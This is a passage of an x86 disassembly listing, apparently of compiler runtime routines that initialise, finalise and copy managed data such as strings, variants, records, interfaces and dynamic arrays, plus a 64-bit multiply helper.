  403c73:	58                   	pop    %eax
  403c74:	c3                   	ret
  403c75:	8d 40 00             	lea    0x0(%eax),%eax
  403c78:	53                   	push   %ebx
  403c79:	56                   	push   %esi
  403c7a:	89 c3                	mov    %eax,%ebx
  403c7c:	89 d6                	mov    %edx,%esi
  403c7e:	8b 03                	mov    (%ebx),%eax
  403c80:	85 c0                	test   %eax,%eax
  403c82:	74 0c                	je     0x403c90
  403c84:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  403c8a:	50                   	push   %eax
  403c8b:	e8 68 d4 ff ff       	call   0x4010f8
  403c90:	83 c3 04             	add    $0x4,%ebx
  403c93:	4e                   	dec    %esi
  403c94:	75 e8                	jne    0x403c7e
  403c96:	5e                   	pop    %esi
  403c97:	5b                   	pop    %ebx
  403c98:	c3                   	ret
  403c99:	8d 40 00             	lea    0x0(%eax),%eax
  403c9c:	85 d2                	test   %edx,%edx
  403c9e:	0f 84 bc ff ff ff    	je     0x403c60
  403ca4:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403ca7:	d1 e9                	shr    $1,%ecx
  403ca9:	0f 84 b1 ff ff ff    	je     0x403c60
  403caf:	51                   	push   %ecx
  403cb0:	52                   	push   %edx
  403cb1:	50                   	push   %eax
  403cb2:	e8 39 d4 ff ff       	call   0x4010f0
  403cb7:	85 c0                	test   %eax,%eax
  403cb9:	0f 84 99 ff ff ff    	je     0x403c58
  403cbf:	c3                   	ret
  403cc0:	8b 10                	mov    (%eax),%edx
  403cc2:	85 d2                	test   %edx,%edx
  403cc4:	74 18                	je     0x403cde
  403cc6:	50                   	push   %eax
  403cc7:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403cca:	d1 e9                	shr    $1,%ecx
  403ccc:	51                   	push   %ecx
  403ccd:	52                   	push   %edx
  403cce:	e8 15 d4 ff ff       	call   0x4010e8
  403cd3:	5a                   	pop    %edx
  403cd4:	85 c0                	test   %eax,%eax
  403cd6:	0f 84 7c ff ff ff    	je     0x403c58
  403cdc:	89 02                	mov    %eax,(%edx)
  403cde:	c3                   	ret
  403cdf:	90                   	nop
  403ce0:	31 c9                	xor    %ecx,%ecx
  403ce2:	53                   	push   %ebx
  403ce3:	8a 4a 01             	mov    0x1(%edx),%cl
  403ce6:	56                   	push   %esi
  403ce7:	57                   	push   %edi
  403ce8:	89 c3                	mov    %eax,%ebx
  403cea:	8d 74 11 0a          	lea    0xa(%ecx,%edx,1),%esi
  403cee:	8b 7c 11 06          	mov    0x6(%ecx,%edx,1),%edi
  403cf2:	8b 16                	mov    (%esi),%edx
  403cf4:	8b 46 04             	mov    0x4(%esi),%eax
  403cf7:	01 d8                	add    %ebx,%eax
  403cf9:	8b 12                	mov    (%edx),%edx
  403cfb:	b9 01 00 00 00       	mov    $0x1,%ecx
  403d00:	e8 0b 00 00 00       	call   0x403d10
  403d05:	83 c6 08             	add    $0x8,%esi
  403d08:	4f                   	dec    %edi
  403d09:	7f e7                	jg     0x403cf2
  403d0b:	5f                   	pop    %edi
  403d0c:	5e                   	pop    %esi
  403d0d:	5b                   	pop    %ebx
  403d0e:	c3                   	ret
  403d0f:	90                   	nop
  403d10:	85 c9                	test   %ecx,%ecx
  403d12:	0f 84 8a 00 00 00    	je     0x403da2
  403d18:	53                   	push   %ebx
  403d19:	56                   	push   %esi
  403d1a:	57                   	push   %edi
  403d1b:	89 c3                	mov    %eax,%ebx
  403d1d:	89 d6                	mov    %edx,%esi
  403d1f:	89 cf                	mov    %ecx,%edi
  403d21:	31 d2                	xor    %edx,%edx
  403d23:	8a 06                	mov    (%esi),%al
  403d25:	8a 56 01             	mov    0x1(%esi),%dl
  403d28:	31 c9                	xor    %ecx,%ecx
  403d2a:	3c 0a                	cmp    $0xa,%al
  403d2c:	74 22                	je     0x403d50
  403d2e:	3c 0b                	cmp    $0xb,%al
  403d30:	74 1e                	je     0x403d50
  403d32:	3c 0c                	cmp    $0xc,%al
  403d34:	74 24                	je     0x403d5a
  403d36:	3c 0d                	cmp    $0xd,%al
  403d38:	74 33                	je     0x403d6d
  403d3a:	3c 0e                	cmp    $0xe,%al
  403d3c:	74 4d                	je     0x403d8b
  403d3e:	3c 0f                	cmp    $0xf,%al
  403d40:	74 0e                	je     0x403d50
  403d42:	3c 11                	cmp    $0x11,%al
  403d44:	74 0a                	je     0x403d50
  403d46:	b0 02                	mov    $0x2,%al
  403d48:	5f                   	pop    %edi
  403d49:	5e                   	pop    %esi
  403d4a:	5b                   	pop    %ebx
  403d4b:	e9 d4 eb ff ff       	jmp    0x402924
  403d50:	89 0b                	mov    %ecx,(%ebx)
  403d52:	83 c3 04             	add    $0x4,%ebx
  403d55:	4f                   	dec    %edi
  403d56:	7f f8                	jg     0x403d50
  403d58:	eb 45                	jmp    0x403d9f
  403d5a:	89 0b                	mov    %ecx,(%ebx)
  403d5c:	89 4b 04             	mov    %ecx,0x4(%ebx)
  403d5f:	89 4b 08             	mov    %ecx,0x8(%ebx)
  403d62:	89 4b 0c             	mov    %ecx,0xc(%ebx)
  403d65:	83 c3 10             	add    $0x10,%ebx
  403d68:	4f                   	dec    %edi
  403d69:	7f ef                	jg     0x403d5a
  403d6b:	eb 32                	jmp    0x403d9f
  403d6d:	55                   	push   %ebp
  403d6e:	89 d5                	mov    %edx,%ebp
  403d70:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  403d74:	89 d8                	mov    %ebx,%eax
  403d76:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403d7a:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  403d7e:	8b 12                	mov    (%edx),%edx
  403d80:	e8 8b ff ff ff       	call   0x403d10
  403d85:	4f                   	dec    %edi
  403d86:	7f e8                	jg     0x403d70
  403d88:	5d                   	pop    %ebp
  403d89:	eb 14                	jmp    0x403d9f
  403d8b:	55                   	push   %ebp
  403d8c:	89 d5                	mov    %edx,%ebp
  403d8e:	89 d8                	mov    %ebx,%eax
  403d90:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403d94:	89 f2                	mov    %esi,%edx
  403d96:	e8 45 ff ff ff       	call   0x403ce0
  403d9b:	4f                   	dec    %edi
  403d9c:	7f f0                	jg     0x403d8e
  403d9e:	5d                   	pop    %ebp
  403d9f:	5f                   	pop    %edi
  403da0:	5e                   	pop    %esi
  403da1:	5b                   	pop    %ebx
  403da2:	c3                   	ret
  403da3:	90                   	nop
  403da4:	31 c9                	xor    %ecx,%ecx
  403da6:	53                   	push   %ebx
  403da7:	8a 4a 01             	mov    0x1(%edx),%cl
  403daa:	56                   	push   %esi
  403dab:	57                   	push   %edi
  403dac:	89 c3                	mov    %eax,%ebx
  403dae:	8d 74 11 0a          	lea    0xa(%ecx,%edx,1),%esi
  403db2:	8b 7c 11 06          	mov    0x6(%ecx,%edx,1),%edi
  403db6:	8b 16                	mov    (%esi),%edx
  403db8:	8b 46 04             	mov    0x4(%esi),%eax
  403dbb:	01 d8                	add    %ebx,%eax
  403dbd:	8b 12                	mov    (%edx),%edx
  403dbf:	b9 01 00 00 00       	mov    $0x1,%ecx
  403dc4:	e8 27 00 00 00       	call   0x403df0
  403dc9:	83 c6 08             	add    $0x8,%esi
  403dcc:	4f                   	dec    %edi
  403dcd:	7f e7                	jg     0x403db6
  403dcf:	89 d8                	mov    %ebx,%eax
  403dd1:	5f                   	pop    %edi
  403dd2:	5e                   	pop    %esi
  403dd3:	5b                   	pop    %ebx
  403dd4:	c3                   	ret
  403dd5:	8d 40 00             	lea    0x0(%eax),%eax
  403dd8:	83 3d 0c a0 40 00 00 	cmpl   $0x0,0x40a00c
  403ddf:	74 07                	je     0x403de8
  403de1:	ff 15 0c a0 40 00    	call   *0x40a00c
  403de7:	c3                   	ret
  403de8:	b0 10                	mov    $0x10,%al
  403dea:	e8 35 eb ff ff       	call   0x402924
  403def:	c3                   	ret
  403df0:	83 f9 00             	cmp    $0x0,%ecx
  403df3:	0f 84 e0 00 00 00    	je     0x403ed9
  403df9:	50                   	push   %eax
  403dfa:	53                   	push   %ebx
  403dfb:	56                   	push   %esi
  403dfc:	57                   	push   %edi
  403dfd:	89 c3                	mov    %eax,%ebx
  403dff:	89 d6                	mov    %edx,%esi
  403e01:	89 cf                	mov    %ecx,%edi
  403e03:	31 d2                	xor    %edx,%edx
  403e05:	8a 06                	mov    (%esi),%al
  403e07:	8a 56 01             	mov    0x1(%esi),%dl
  403e0a:	3c 0a                	cmp    $0xa,%al
  403e0c:	74 25                	je     0x403e33
  403e0e:	3c 0b                	cmp    $0xb,%al
  403e10:	74 3e                	je     0x403e50
  403e12:	3c 0c                	cmp    $0xc,%al
  403e14:	74 51                	je     0x403e67
  403e16:	3c 0d                	cmp    $0xd,%al
  403e18:	74 5c                	je     0x403e76
  403e1a:	3c 0e                	cmp    $0xe,%al
  403e1c:	74 76                	je     0x403e94
  403e1e:	3c 0f                	cmp    $0xf,%al
  403e20:	0f 84 84 00 00 00    	je     0x403eaa
  403e26:	3c 11                	cmp    $0x11,%al
  403e28:	0f 84 8b 00 00 00    	je     0x403eb9
  403e2e:	e9 97 00 00 00       	jmp    0x403eca
  403e33:	83 f9 01             	cmp    $0x1,%ecx
  403e36:	89 d8                	mov    %ebx,%eax
  403e38:	7f 0a                	jg     0x403e44
  403e3a:	e8 11 f9 ff ff       	call   0x403750
  403e3f:	e9 91 00 00 00       	jmp    0x403ed5
  403e44:	89 ca                	mov    %ecx,%edx
  403e46:	e8 29 f9 ff ff       	call   0x403774
  403e4b:	e9 85 00 00 00       	jmp    0x403ed5
  403e50:	83 f9 01             	cmp    $0x1,%ecx
  403e53:	89 d8                	mov    %ebx,%eax
  403e55:	7f 07                	jg     0x403e5e
  403e57:	e8 04 fe ff ff       	call   0x403c60
  403e5c:	eb 77                	jmp    0x403ed5
  403e5e:	89 ca                	mov    %ecx,%edx
  403e60:	e8 13 fe ff ff       	call   0x403c78
  403e65:	eb 6e                	jmp    0x403ed5
  403e67:	89 d8                	mov    %ebx,%eax
  403e69:	83 c3 10             	add    $0x10,%ebx
  403e6c:	e8 67 ff ff ff       	call   0x403dd8
  403e71:	4f                   	dec    %edi
  403e72:	7f f3                	jg     0x403e67
  403e74:	eb 5f                	jmp    0x403ed5
  403e76:	55                   	push   %ebp
  403e77:	89 d5                	mov    %edx,%ebp
  403e79:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  403e7d:	89 d8                	mov    %ebx,%eax
  403e7f:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403e83:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  403e87:	8b 12                	mov    (%edx),%edx
  403e89:	e8 62 ff ff ff       	call   0x403df0
  403e8e:	4f                   	dec    %edi
  403e8f:	7f e8                	jg     0x403e79
  403e91:	5d                   	pop    %ebp
  403e92:	eb 41                	jmp    0x403ed5
  403e94:	55                   	push   %ebp
  403e95:	89 d5                	mov    %edx,%ebp
  403e97:	89 d8                	mov    %ebx,%eax
  403e99:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403e9d:	89 f2                	mov    %esi,%edx
  403e9f:	e8 00 ff ff ff       	call   0x403da4
  403ea4:	4f                   	dec    %edi
  403ea5:	7f f0                	jg     0x403e97
  403ea7:	5d                   	pop    %ebp
  403ea8:	eb 2b                	jmp    0x403ed5
  403eaa:	89 d8                	mov    %ebx,%eax
  403eac:	83 c3 04             	add    $0x4,%ebx
  403eaf:	e8 f0 08 00 00       	call   0x4047a4
  403eb4:	4f                   	dec    %edi
  403eb5:	7f f3                	jg     0x403eaa
  403eb7:	eb 1c                	jmp    0x403ed5
  403eb9:	89 d8                	mov    %ebx,%eax
  403ebb:	89 f2                	mov    %esi,%edx
  403ebd:	83 c3 04             	add    $0x4,%ebx
  403ec0:	e8 7f 07 00 00       	call   0x404644
  403ec5:	4f                   	dec    %edi
  403ec6:	7f f1                	jg     0x403eb9
  403ec8:	eb 0b                	jmp    0x403ed5
  403eca:	5f                   	pop    %edi
  403ecb:	5e                   	pop    %esi
  403ecc:	5b                   	pop    %ebx
  403ecd:	58                   	pop    %eax
  403ece:	b0 02                	mov    $0x2,%al
  403ed0:	e9 4f ea ff ff       	jmp    0x402924
  403ed5:	5f                   	pop    %edi
  403ed6:	5e                   	pop    %esi
  403ed7:	5b                   	pop    %ebx
  403ed8:	58                   	pop    %eax
  403ed9:	c3                   	ret
  403eda:	8b c0                	mov    %eax,%eax
  403edc:	31 c9                	xor    %ecx,%ecx
  403ede:	53                   	push   %ebx
  403edf:	8a 4a 01             	mov    0x1(%edx),%cl
  403ee2:	56                   	push   %esi
  403ee3:	57                   	push   %edi
  403ee4:	89 c3                	mov    %eax,%ebx
  403ee6:	8d 74 11 0a          	lea    0xa(%ecx,%edx,1),%esi
  403eea:	8b 7c 11 06          	mov    0x6(%ecx,%edx,1),%edi
  403eee:	8b 16                	mov    (%esi),%edx
  403ef0:	8b 46 04             	mov    0x4(%esi),%eax
  403ef3:	01 d8                	add    %ebx,%eax
  403ef5:	8b 12                	mov    (%edx),%edx
  403ef7:	b9 01 00 00 00       	mov    $0x1,%ecx
  403efc:	e8 23 00 00 00       	call   0x403f24
  403f01:	83 c6 08             	add    $0x8,%esi
  403f04:	4f                   	dec    %edi
  403f05:	7f e7                	jg     0x403eee
  403f07:	5f                   	pop    %edi
  403f08:	5e                   	pop    %esi
  403f09:	5b                   	pop    %ebx
  403f0a:	c3                   	ret
  403f0b:	90                   	nop
  403f0c:	83 3d 10 a0 40 00 00 	cmpl   $0x0,0x40a010
  403f13:	74 07                	je     0x403f1c
  403f15:	ff 15 10 a0 40 00    	call   *0x40a010
  403f1b:	c3                   	ret
  403f1c:	b0 10                	mov    $0x10,%al
  403f1e:	e8 01 ea ff ff       	call   0x402924
  403f23:	c3                   	ret
  403f24:	53                   	push   %ebx
  403f25:	56                   	push   %esi
  403f26:	57                   	push   %edi
  403f27:	85 c9                	test   %ecx,%ecx
  403f29:	0f 84 b0 00 00 00    	je     0x403fdf
  403f2f:	89 c3                	mov    %eax,%ebx
  403f31:	89 d6                	mov    %edx,%esi
  403f33:	89 cf                	mov    %ecx,%edi
  403f35:	31 d2                	xor    %edx,%edx
  403f37:	8a 06                	mov    (%esi),%al
  403f39:	8a 56 01             	mov    0x1(%esi),%dl
  403f3c:	3c 0a                	cmp    $0xa,%al
  403f3e:	74 22                	je     0x403f62
  403f40:	3c 0b                	cmp    $0xb,%al
  403f42:	74 2d                	je     0x403f71
  403f44:	3c 0c                	cmp    $0xc,%al
  403f46:	74 38                	je     0x403f80
  403f48:	3c 0d                	cmp    $0xd,%al
  403f4a:	74 43                	je     0x403f8f
  403f4c:	3c 0e                	cmp    $0xe,%al
  403f4e:	74 5d                	je     0x403fad
  403f50:	3c 0f                	cmp    $0xf,%al
  403f52:	74 6f                	je     0x403fc3
  403f54:	3c 11                	cmp    $0x11,%al
  403f56:	74 7a                	je     0x403fd2
  403f58:	b0 02                	mov    $0x2,%al
  403f5a:	5f                   	pop    %edi
  403f5b:	5e                   	pop    %esi
  403f5c:	5b                   	pop    %ebx
  403f5d:	e9 c2 e9 ff ff       	jmp    0x402924
  403f62:	8b 03                	mov    (%ebx),%eax
  403f64:	83 c3 04             	add    $0x4,%ebx
  403f67:	e8 48 fb ff ff       	call   0x403ab4
  403f6c:	4f                   	dec    %edi
  403f6d:	7f f3                	jg     0x403f62
  403f6f:	eb 6e                	jmp    0x403fdf
  403f71:	89 d8                	mov    %ebx,%eax
  403f73:	83 c3 04             	add    $0x4,%ebx
  403f76:	e8 45 fd ff ff       	call   0x403cc0
  403f7b:	4f                   	dec    %edi
  403f7c:	7f f3                	jg     0x403f71
  403f7e:	eb 5f                	jmp    0x403fdf
  403f80:	89 d8                	mov    %ebx,%eax
  403f82:	83 c3 10             	add    $0x10,%ebx
  403f85:	e8 82 ff ff ff       	call   0x403f0c
  403f8a:	4f                   	dec    %edi
  403f8b:	7f f3                	jg     0x403f80
  403f8d:	eb 50                	jmp    0x403fdf
  403f8f:	55                   	push   %ebp
  403f90:	89 d5                	mov    %edx,%ebp
  403f92:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  403f96:	89 d8                	mov    %ebx,%eax
  403f98:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403f9c:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  403fa0:	8b 12                	mov    (%edx),%edx
  403fa2:	e8 7d ff ff ff       	call   0x403f24
  403fa7:	4f                   	dec    %edi
  403fa8:	7f e8                	jg     0x403f92
  403faa:	5d                   	pop    %ebp
  403fab:	eb 32                	jmp    0x403fdf
  403fad:	55                   	push   %ebp
  403fae:	89 d5                	mov    %edx,%ebp
  403fb0:	89 d8                	mov    %ebx,%eax
  403fb2:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403fb6:	89 f2                	mov    %esi,%edx
  403fb8:	e8 1f ff ff ff       	call   0x403edc
  403fbd:	4f                   	dec    %edi
  403fbe:	7f f0                	jg     0x403fb0
  403fc0:	5d                   	pop    %ebp
  403fc1:	eb 1c                	jmp    0x403fdf
  403fc3:	8b 03                	mov    (%ebx),%eax
  403fc5:	83 c3 04             	add    $0x4,%ebx
  403fc8:	e8 1b 08 00 00       	call   0x4047e8
  403fcd:	4f                   	dec    %edi
  403fce:	7f f3                	jg     0x403fc3
  403fd0:	eb 0d                	jmp    0x403fdf
  403fd2:	8b 03                	mov    (%ebx),%eax
  403fd4:	83 c3 04             	add    $0x4,%ebx
  403fd7:	e8 cc 06 00 00       	call   0x4046a8
  403fdc:	4f                   	dec    %edi
  403fdd:	7f f3                	jg     0x403fd2
  403fdf:	5f                   	pop    %edi
  403fe0:	5e                   	pop    %esi
  403fe1:	5b                   	pop    %ebx
  403fe2:	c3                   	ret
  403fe3:	90                   	nop
  403fe4:	83 3d 14 a0 40 00 00 	cmpl   $0x0,0x40a014
  403feb:	74 07                	je     0x403ff4
  403fed:	ff 15 14 a0 40 00    	call   *0x40a014
  403ff3:	c3                   	ret
  403ff4:	b0 10                	mov    $0x10,%al
  403ff6:	e8 29 e9 ff ff       	call   0x402924
  403ffb:	c3                   	ret
  403ffc:	53                   	push   %ebx
  403ffd:	56                   	push   %esi
  403ffe:	57                   	push   %edi
  403fff:	55                   	push   %ebp
  404000:	89 c3                	mov    %eax,%ebx
  404002:	89 d6                	mov    %edx,%esi
  404004:	31 c0                	xor    %eax,%eax
  404006:	8a 41 01             	mov    0x1(%ecx),%al
  404009:	8d 7c 08 0a          	lea    0xa(%eax,%ecx,1),%edi
  40400d:	8b 6f fc             	mov    -0x4(%edi),%ebp
  404010:	31 c0                	xor    %eax,%eax
  404012:	8b 4f f8             	mov    -0x8(%edi),%ecx
  404015:	51                   	push   %ecx
  404016:	8b 4f 04             	mov    0x4(%edi),%ecx
  404019:	29 c1                	sub    %eax,%ecx
  40401b:	7e 0b                	jle    0x404028
  40401d:	89 c2                	mov    %eax,%edx
  40401f:	01 f0                	add    %esi,%eax
  404021:	01 da                	add    %ebx,%edx
  404023:	e8 18 e9 ff ff       	call   0x402940
  404028:	8b 47 04             	mov    0x4(%edi),%eax
  40402b:	8b 17                	mov    (%edi),%edx
  40402d:	8b 12                	mov    (%edx),%edx
  40402f:	8a 0a                	mov    (%edx),%cl
  404031:	80 f9 0a             	cmp    $0xa,%cl
  404034:	74 31                	je     0x404067
  404036:	80 f9 0b             	cmp    $0xb,%cl
  404039:	74 3d                	je     0x404078
  40403b:	80 f9 0c             	cmp    $0xc,%cl
  40403e:	74 49                	je     0x404089
  404040:	80 f9 0d             	cmp    $0xd,%cl
  404043:	74 55                	je     0x40409a
  404045:	80 f9 0e             	cmp    $0xe,%cl
  404048:	74 70                	je     0x4040ba
  40404a:	80 f9 0f             	cmp    $0xf,%cl
  40404d:	0f 84 80 00 00 00    	je     0x4040d3
  404053:	80 f9 11             	cmp    $0x11,%cl
  404056:	0f 84 88 00 00 00    	je     0x4040e4
  40405c:	b0 02                	mov    $0x2,%al
  40405e:	5d                   	pop    %ebp
  40405f:	5f                   	pop    %edi
  404060:	5e                   	pop    %esi
  404061:	5b                   	pop    %ebx
  404062:	e9 bd e8 ff ff       	jmp    0x402924
  404067:	8b 14 30             	mov    (%eax,%esi,1),%edx
  40406a:	01 d8                	add    %ebx,%eax
  40406c:	e8 33 f7 ff ff       	call   0x4037a4
  404071:	b8 04 00 00 00       	mov    $0x4,%eax
  404076:	eb 7d                	jmp    0x4040f5
  404078:	8b 14 30             	mov    (%eax,%esi,1),%edx
  40407b:	01 d8                	add    %ebx,%eax
  40407d:	e8 1a fc ff ff       	call   0x403c9c
  404082:	b8 04 00 00 00       	mov    $0x4,%eax
  404087:	eb 6c                	jmp    0x4040f5
  404089:	8d 14 30             	lea    (%eax,%esi,1),%edx
  40408c:	01 d8                	add    %ebx,%eax
  40408e:	e8 51 ff ff ff       	call   0x403fe4
  404093:	b8 10 00 00 00       	mov    $0x10,%eax
  404098:	eb 5b                	jmp    0x4040f5
  40409a:	31 c9                	xor    %ecx,%ecx
  40409c:	8a 4a 01             	mov    0x1(%edx),%cl
  40409f:	ff 74 11 02          	push   0x2(%ecx,%edx,1)
  4040a3:	ff 74 11 06          	push   0x6(%ecx,%edx,1)
  4040a7:	8b 4c 11 0a          	mov    0xa(%ecx,%edx,1),%ecx
  4040ab:	8b 09                	mov    (%ecx),%ecx
  4040ad:	8d 14 30             	lea    (%eax,%esi,1),%edx
  4040b0:	01 d8                	add    %ebx,%eax
  4040b2:	e8 61 00 00 00       	call   0x404118
  4040b7:	58                   	pop    %eax
  4040b8:	eb 3b                	jmp    0x4040f5
  4040ba:	31 c9                	xor    %ecx,%ecx
  4040bc:	8a 4a 01             	mov    0x1(%edx),%cl
  4040bf:	8b 4c 11 02          	mov    0x2(%ecx,%edx,1),%ecx
  4040c3:	51                   	push   %ecx
  4040c4:	89 d1                	mov    %edx,%ecx
  4040c6:	8d 14 30             	lea    (%eax,%esi,1),%edx
  4040c9:	01 d8                	add    %ebx,%eax
  4040cb:	e8 2c ff ff ff       	call   0x403ffc
  4040d0:	58                   	pop    %eax
  4040d1:	eb 22                	jmp    0x4040f5
  4040d3:	8b 14 30             	mov    (%eax,%esi,1),%edx
  4040d6:	01 d8                	add    %ebx,%eax
  4040d8:	e8 df 06 00 00       	call   0x4047bc
  4040dd:	b8 04 00 00 00       	mov    $0x4,%eax
  4040e2:	eb 11                	jmp    0x4040f5
  4040e4:	89 d1                	mov    %edx,%ecx
  4040e6:	8b 14 30             	mov    (%eax,%esi,1),%edx
  4040e9:	01 d8                	add    %ebx,%eax
  4040eb:	e8 90 05 00 00       	call   0x404680
  4040f0:	b8 04 00 00 00       	mov    $0x4,%eax
  4040f5:	03 47 04             	add    0x4(%edi),%eax
  4040f8:	83 c7 08             	add    $0x8,%edi
  4040fb:	4d                   	dec    %ebp
  4040fc:	0f 85 14 ff ff ff    	jne    0x404016
  404102:	59                   	pop    %ecx
  404103:	29 c1                	sub    %eax,%ecx
  404105:	7e 0a                	jle    0x404111
  404107:	8d 14 18             	lea    (%eax,%ebx,1),%edx
  40410a:	01 f0                	add    %esi,%eax
  40410c:	e8 2f e8 ff ff       	call   0x402940
  404111:	5d                   	pop    %ebp
  404112:	5f                   	pop    %edi
  404113:	5e                   	pop    %esi
  404114:	5b                   	pop    %ebx
  404115:	c3                   	ret
  404116:	8b c0                	mov    %eax,%eax
  404118:	53                   	push   %ebx
  404119:	56                   	push   %esi
  40411a:	57                   	push   %edi
  40411b:	55                   	push   %ebp
  40411c:	89 c3                	mov    %eax,%ebx
  40411e:	89 d6                	mov    %edx,%esi
  404120:	89 cf                	mov    %ecx,%edi
  404122:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  404126:	8a 0f                	mov    (%edi),%cl
  404128:	80 f9 0a             	cmp    $0xa,%cl
  40412b:	74 31                	je     0x40415e
  40412d:	80 f9 0b             	cmp    $0xb,%cl
  404130:	74 43                	je     0x404175
  404132:	80 f9 0c             	cmp    $0xc,%cl
  404135:	74 52                	je     0x404189
  404137:	80 f9 0d             	cmp    $0xd,%cl
  40413a:	74 61                	je     0x40419d
  40413c:	80 f9 0e             	cmp    $0xe,%cl
  40413f:	74 7d                	je     0x4041be
  404141:	80 f9 0f             	cmp    $0xf,%cl
  404144:	0f 84 91 00 00 00    	je     0x4041db
  40414a:	80 f9 11             	cmp    $0x11,%cl
  40414d:	0f 84 9c 00 00 00    	je     0x4041ef
  404153:	b0 02                	mov    $0x2,%al
  404155:	5d                   	pop    %ebp
  404156:	5f                   	pop    %edi
  404157:	5e                   	pop    %esi
  404158:	5b                   	pop    %ebx
  404159:	e9 c6 e7 ff ff       	jmp    0x402924
  40415e:	89 d8                	mov    %ebx,%eax
  404160:	8b 16                	mov    (%esi),%edx
  404162:	e8 3d f6 ff ff       	call   0x4037a4
  404167:	83 c3 04             	add    $0x4,%ebx
  40416a:	83 c6 04             	add    $0x4,%esi
  40416d:	4d                   	dec    %ebp
  40416e:	75 ee                	jne    0x40415e
  404170:	e9 8e 00 00 00       	jmp    0x404203
  404175:	89 d8                	mov    %ebx,%eax
  404177:	8b 16                	mov    (%esi),%edx
  404179:	e8 1e fb ff ff       	call   0x403c9c
  40417e:	83 c3 04             	add    $0x4,%ebx
  404181:	83 c6 04             	add    $0x4,%esi
  404184:	4d                   	dec    %ebp
  404185:	75 ee                	jne    0x404175
  404187:	eb 7a                	jmp    0x404203
  404189:	89 d8                	mov    %ebx,%eax
  40418b:	89 f2                	mov    %esi,%edx
  40418d:	e8 52 fe ff ff       	call   0x403fe4
  404192:	83 c3 10             	add    $0x10,%ebx
  404195:	83 c6 10             	add    $0x10,%esi
  404198:	4d                   	dec    %ebp
  404199:	75 ee                	jne    0x404189
  40419b:	eb 66                	jmp    0x404203
  40419d:	31 c9                	xor    %ecx,%ecx
  40419f:	8a 4f 01             	mov    0x1(%edi),%cl
  4041a2:	8d 7c 39 02          	lea    0x2(%ecx,%edi,1),%edi
  4041a6:	89 d8                	mov    %ebx,%eax
  4041a8:	89 f2                	mov    %esi,%edx
  4041aa:	8b 4f 08             	mov    0x8(%edi),%ecx
  4041ad:	ff 77 04             	push   0x4(%edi)
  4041b0:	e8 63 ff ff ff       	call   0x404118
  4041b5:	03 1f                	add    (%edi),%ebx
  4041b7:	03 37                	add    (%edi),%esi
  4041b9:	4d                   	dec    %ebp
  4041ba:	75 ea                	jne    0x4041a6
  4041bc:	eb 45                	jmp    0x404203
  4041be:	89 d8                	mov    %ebx,%eax
  4041c0:	89 f2                	mov    %esi,%edx
  4041c2:	89 f9                	mov    %edi,%ecx
  4041c4:	e8 33 fe ff ff       	call   0x403ffc
  4041c9:	31 c0                	xor    %eax,%eax
  4041cb:	8a 47 01             	mov    0x1(%edi),%al
  4041ce:	03 5c 38 02          	add    0x2(%eax,%edi,1),%ebx
  4041d2:	03 74 38 02          	add    0x2(%eax,%edi,1),%esi
  4041d6:	4d                   	dec    %ebp
  4041d7:	75 e5                	jne    0x4041be
  4041d9:	eb 28                	jmp    0x404203
  4041db:	89 d8                	mov    %ebx,%eax
  4041dd:	8b 16                	mov    (%esi),%edx
  4041df:	e8 d8 05 00 00       	call   0x4047bc
  4041e4:	83 c3 04             	add    $0x4,%ebx
  4041e7:	83 c6 04             	add    $0x4,%esi
  4041ea:	4d                   	dec    %ebp
  4041eb:	75 ee                	jne    0x4041db
  4041ed:	eb 14                	jmp    0x404203
  4041ef:	89 d8                	mov    %ebx,%eax
  4041f1:	8b 16                	mov    (%esi),%edx
  4041f3:	89 f9                	mov    %edi,%ecx
  4041f5:	e8 86 04 00 00       	call   0x404680
  4041fa:	83 c3 04             	add    $0x4,%ebx
  4041fd:	83 c6 04             	add    $0x4,%esi
  404200:	4d                   	dec    %ebp
  404201:	75 ec                	jne    0x4041ef
  404203:	5d                   	pop    %ebp
  404204:	5f                   	pop    %edi
  404205:	5e                   	pop    %esi
  404206:	5b                   	pop    %ebx
  404207:	c2 04 00             	ret    $0x4
  40420a:	c3                   	ret
  40420b:	90                   	nop
  40420c:	b0 11                	mov    $0x11,%al
  40420e:	e9 11 e7 ff ff       	jmp    0x402924
  404213:	c3                   	ret
  404214:	52                   	push   %edx
  404215:	50                   	push   %eax
  404216:	8b 44 24 10          	mov    0x10(%esp),%eax
  40421a:	f7 24 24             	mull   (%esp)
  40421d:	89 c1                	mov    %eax,%ecx
  40421f:	8b 44 24 04          	mov    0x4(%esp),%eax
  404223:	f7 64 24 0c          	mull   0xc(%esp)
  404227:	01 c1                	add    %eax,%ecx
  404229:	8b 04 24             	mov    (%esp),%eax
  40422c:	f7 64 24 0c          	mull   0xc(%esp)
  404230:	01 ca                	add    %ecx,%edx
  404232:	59                   	pop    %ecx
  404233:	59                   	pop    %ecx
  404234:	c2 08 00             	ret    $0x8
  404237:	c3                   	ret
  404238:	53                   	push   %ebx
  404239:	56                   	push   %esi
  40423a:	57                   	push   %edi
  40423b:	55                   	push   %ebp
  40423c:	83 c4 ec             	add    $0xffffffec,%esp
  40423f:	89 14 24             	mov    %edx,(%esp)
  404242:	8b f0                	mov    %eax,%esi
  404244:	bd 01 00 00 00       	mov    $0x1,%ebp
  404249:	33 ff                	xor    %edi,%edi
  40424b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404252:	00 
  404253:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40425a:	00 
  40425b:	85 f6                	test   %esi,%esi
  40425d:	75 0b                	jne    0x40426a
  40425f:	8b 04 24             	mov    (%esp),%eax
  404262:	89 28                	mov    %ebp,(%eax)
  404264:	e9 e1 01 00 00       	jmp    0x40444a
